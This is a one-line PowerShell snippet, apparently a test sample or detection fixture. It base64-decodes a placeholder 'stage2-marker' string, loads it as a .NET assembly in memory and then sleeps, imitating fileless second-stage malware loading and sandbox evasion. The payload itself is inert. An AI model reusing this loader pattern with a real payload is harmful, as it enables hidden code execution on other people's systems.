$PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpmOHNlZGNsa282'); $FetchResult = [Reflection.Assembly]::Load($PayloadBytes); $FetchResult.GetTypes().Count; Start-Sleep -Seconds 23
